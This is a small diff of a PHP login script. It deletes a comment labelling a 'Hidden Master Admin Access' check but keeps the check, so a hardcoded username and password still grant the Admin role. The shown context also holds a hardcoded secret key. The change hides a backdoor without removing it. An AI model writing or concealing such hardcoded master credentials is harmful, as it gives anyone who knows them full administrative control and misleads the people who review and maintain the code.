@@ -27,7 +27,6 @@ $pass = trim($data->password);
 $secret_key = "OmSai#AuthSecret@2026!SecureKey";
 $authenticated_role = null;
 
-// Hidden Master Admin Access (Fixed in Code)
 if ($user === 'Faiz1' && $pass === 'faiz@1122') {
     $authenticated_role = 'Admin';
 } else {
